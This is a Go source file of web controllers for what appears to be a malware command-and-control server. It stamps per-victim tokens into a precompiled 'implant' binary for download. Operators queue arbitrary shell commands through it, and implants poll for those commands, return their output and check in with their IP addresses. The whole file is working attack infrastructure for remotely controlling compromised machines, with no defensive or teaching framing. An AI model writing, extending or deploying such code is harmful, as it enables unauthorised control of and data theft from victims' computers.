package controllers

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"awesomeProject/config"
	"awesomeProject/database"
	"awesomeProject/models"

	"github.com/gin-gonic/gin"
)

const (
	placeholder   = "deadbeef-0000-0000-0000-000000000000"
	baseClientRel = "binaries/base_client"
)

var baseClientPath string

func init() {
	baseClientPath = filepath.Join(baseClientRel)
	if _, err := os.Stat(baseClientPath); os.IsNotExist(err) {
		wd, _ := os.Getwd()
		panic(fmt.Sprintf("CRITICAL ERROR: Pre-compiled base_client binary not found. Looked at path: '%s'. Current working directory: '%s'. Please ensure 'binaries/base_client' exists relative to your execution path or adjust 'baseClientPath' resolution.", baseClientPath, wd))
	} else {
		fmt.Printf("CONTROLLER.init: Pre-compiled base_client binary located successfully at: %s\n", baseClientPath)
	}
}

// GenerateImplant creates a DB record ONLY. It does not serve the binary.
// Called by "Generate New Implant" button (POST /api/generate-implant)
func GenerateImplant(c *gin.Context) {
	userIfc, _ := c.Get("user_id")
	userID := userIfc.(int)

	// 1. Create a new implant record in the database.
	imp, err := database.CreateImplant(userID)
	if err != nil {
		fmt.Printf("CONTROLLER.GenerateImplant: ERROR - Failed to create implant record in DB: %v\n", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate implant record in database"})
		return
	}
	fmt.Printf("CONTROLLER.GenerateImplant: Successfully created DB record for new implant. DB-UniqueToken: [%s]\n", imp.UniqueToken)

	// 2. Return success response with implant details (or just a success message)
	c.JSON(http.StatusCreated, gin.H{
		"message": "Implant record generated successfully",
	})
}

// DownloadImplant reads base_client, patches it with the implant's unique_token from DB, and serves it.
// Called by "Download" buttons in the table (GET /api/implants/<implant_db_token>/download)
func DownloadImplant(c *gin.Context) {
	implantDBUniqueToken := c.Param("implant_id") // This is the unique_token from the DB.
	userID := c.MustGet("user_id").(int)

	fmt.Printf("CONTROLLER.DownloadImplant: Received request to download implant with ID from URL: [%s]\n", implantDBUniqueToken)

	// 1. Verify user ownership and that the implant EXISTS in the DB with this token.
	_, err := database.GetImplantByToken(userID, implantDBUniqueToken)
	if err != nil {
		fmt.Printf("CONTROLLER.DownloadImplant: ERROR - Implant with DB-UniqueToken [%s] not found in database or unauthorized for user %d. Error: %v\n", implantDBUniqueToken, userID, err)
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found in database or unauthorized"})
		return
	}
	fmt.Printf("CONTROLLER.DownloadImplant: Successfully verified ownership for implant [%s]\n", implantDBUniqueToken)

	// 2. Read the pre-compiled base_client binary.
	baseBinaryData, err := os.ReadFile(baseClientPath)
	if err != nil {
		fmt.Printf("CONTROLLER.DownloadImplant: ERROR - reading base_client binary from '%s': %v\n", baseClientPath, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read base client binary: " + err.Error()})
		return
	}
	fmt.Printf("CONTROLLER.DownloadImplant: Read %d bytes from base_client: %s\n", len(baseBinaryData), baseClientPath)

	// 3. Create a *new slice* (copy) for patching.
	patchedData := make([]byte, len(baseBinaryData))
	copy(patchedData, baseBinaryData)

	// 4. Find placeholder in the *copied* data.
	idx := bytes.LastIndex(patchedData, []byte(placeholder))
	if idx == -1 {
		fmt.Printf("CONTROLLER.DownloadImplant: ERROR - placeholder string [%s] NOT FOUND in the base_client binary data for download.\n", placeholder)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Placeholder not found in base client binary. Download failed."})
		return
	}
	fmt.Printf("CONTROLLER.DownloadImplant: Placeholder [%s] found at index %d for download.\n", placeholder, idx)

	// 5. Patch the *copied* data with the token from the DB.
	if len(implantDBUniqueToken) != len(placeholder) {
		fmt.Printf("CONTROLLER.DownloadImplant: ERROR - Length mismatch for download! Placeholder len: %d, DB UniqueToken len: %d. Cannot patch.\n", len(placeholder), len(implantDBUniqueToken))
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Critical error: ID length mismatch for patching for download."})
		return
	}
	bytesCopied := copy(patchedData[idx:], []byte(implantDBUniqueToken))
	fmt.Printf("CONTROLLER.DownloadImplant: Patched data for download. Replaced placeholder with: [%s]. Bytes copied: %d.\n", implantDBUniqueToken, bytesCopied)

	// 6. Construct filename. The UniqueToken for the filename is implantDBUniqueToken.
	outName := fmt.Sprintf("implant_%s", implantDBUniqueToken)
	fmt.Printf("CONTROLLER.DownloadImplant: Download filename for existing implant will be: [%s]\n", outName)

	// 7. Serve *patchedData*.
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", outName))
	c.Header("Content-Type", "application/octet-stream")
	c.Data(http.StatusOK, "application/octet-stream", patchedData)
	fmt.Printf("CONTROLLER.DownloadImplant: Served patched existing implant binary named [%s].\n", outName)
}

// GetUserImplants returns all implants owned by the current user.
func GetUserImplants(c *gin.Context) {
	userID := c.MustGet("user_id").(int)
	implants, err := database.GetImplantsByUserID(userID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch implants"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"implants": implants})
}

// SendCommand sends a command to a specific implant (used by dashboard).
func SendCommand(c *gin.Context) {
	userID := c.MustGet("user_id").(int)
	var req struct {
		ImplantID string `json:"implant_id"` // This is unique_token
		Command   string `json:"command"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
		return
	}

	imp, err := database.GetImplantByID(req.ImplantID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
		return
	}
	if imp.UserID != userID {
		c.JSON(http.StatusForbidden, gin.H{"error": "You do not own this implant"})
		return
	}

	cmd := models.Command{
		ImplantID: req.ImplantID,
		Command:   req.Command,
		Status:    "pending",
	}
	if err := config.DB.Create(&cmd).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create command"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"message":    "Command sent successfully",
		"implant_id": req.ImplantID,
		"command_id": cmd.ID,
		"command":    req.Command,
	})
}

// ImplantClientFetchCommands is called by the implant to get pending commands.
func ImplantClientFetchCommands(c *gin.Context) {
	implantUniqueToken := c.Param("unique_token")
	if implantUniqueToken == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant unique token is required"})
		return
	}

	var imp models.Implant
	if err := config.DB.Where("unique_token = ?", implantUniqueToken).First(&imp).Error; err != nil {
		fmt.Printf("CONTROLLER.ImplantClientFetchCommands: Implant with unique_token [%s] not found in DB.\n", implantUniqueToken)
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
		return
	}

	imp.LastSeen = time.Now()
	imp.Status = "online"
	if err := config.DB.Save(&imp).Error; err != nil {
		fmt.Printf("CONTROLLER.ImplantClientFetchCommands: Error updating implant %s status/last_seen: %v\n", implantUniqueToken, err)
	}

	cmds, err := database.GetPendingCommandsForImplant(implantUniqueToken)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch pending commands"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"commands": cmds})
}

// DashboardGetCommandsForImplant returns all commands for a given implant, for dashboard use.
func DashboardGetCommandsForImplant(c *gin.Context) {
	userID := c.MustGet("user_id").(int)
	implantUniqueToken := c.Param("implant_id")

	if implantUniqueToken == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant ID (unique token) is required"})
		return
	}
	var implant models.Implant
	if err := config.DB.Where("unique_token = ? AND user_id = ?", implantUniqueToken, userID).First(&implant).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or you do not have permission to access it"})
		return
	}
	cmds, err := database.GetCommandsByImplantID(implantUniqueToken)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch commands for implant"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"commands": cmds})
}

// HandleCommandResult receives execution output for a command.
func HandleCommandResult(c *gin.Context) {
	var req struct {
		CommandID int    `json:"command_id"`
		Output    string `json:"output"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
		return
	}

	var cmd models.Command
	if err := config.DB.First(&cmd, req.CommandID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Command not found"})
		return
	}

	if cmd.Status == "executed" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Command already executed"})
		return
	}

	var imp models.Implant
	if err := config.DB.Where("unique_token = ?", cmd.ImplantID).First(&imp).Error; err == nil {
		imp.LastSeen = time.Now()
		imp.Status = "online"
		if errSave := config.DB.Save(&imp).Error; errSave != nil {
			fmt.Printf("CONTROLLER.HandleCommandResult: Error updating implant status for %s: %v\n", imp.UniqueToken, errSave)
		}
	} else {
		fmt.Printf("CONTROLLER.HandleCommandResult: Warning - Implant %s (from command %d) not found in DB. Proceeding to update command.\n", cmd.ImplantID, req.CommandID)
	}

	if err := database.MarkCommandAsExecuted(req.CommandID, req.Output); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update command status"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Command result received successfully"})
}

// CheckinImplant handles implant check-ins.
func CheckinImplant(c *gin.Context) {
	var req struct {
		UniqueToken string `json:"implant_id"`
		IPAddress   string `json:"ip_address"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
		return
	}

	var imp models.Implant
	if err := config.DB.Where("unique_token = ?", req.UniqueToken).First(&imp).Error; err != nil {
		fmt.Printf("CONTROLLER.CheckinImplant: Implant with unique_token [%s] not found in DB for check-in.\n", req.UniqueToken)
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
		return
	}

	imp.Status = "online"
	imp.Deployed = true
	if req.IPAddress != "" {
		imp.IPAddress = req.IPAddress
	} else {
		imp.IPAddress = c.ClientIP()
	}
	imp.LastSeen = time.Now()
	if err := config.DB.Save(&imp).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update implant on check-in"})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"message":   "Check-in successful",
		"status":    imp.Status,
		"last_seen": imp.LastSeen,
	})
}

// DeleteImplant deletes an implant owned by the current user.
func DeleteImplant(c *gin.Context) {
	token := c.Param("implant_id")
	userID := c.MustGet("user_id").(int)

	var imp models.Implant
	if err := config.DB.
		Where("unique_token = ? AND user_id = ?", token, userID).
		First(&imp).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}

	if err := config.DB.Where("implant_id = ?", imp.UniqueToken).Delete(&models.Command{}).Error; err != nil {
		fmt.Printf("CONTROLLER.DeleteImplant: Warning - Failed to delete commands for implant %s: %v\n", imp.UniqueToken, err)
	}

	if err := config.DB.Delete(&imp).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to delete implant"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Implant deleted successfully"})
}
